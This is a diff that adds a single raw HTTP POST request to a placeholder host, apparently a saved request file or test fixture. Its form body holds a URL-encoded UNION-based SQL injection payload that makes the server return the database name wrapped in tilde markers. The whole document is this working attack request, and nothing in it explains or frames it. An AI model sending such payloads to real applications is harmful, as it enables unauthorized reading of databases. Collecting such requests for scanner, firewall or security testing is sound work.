@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+Connection: close
+
+id=1+union+select+concat%280x7e%2Cdatabase%28%29%2C0x7e%29
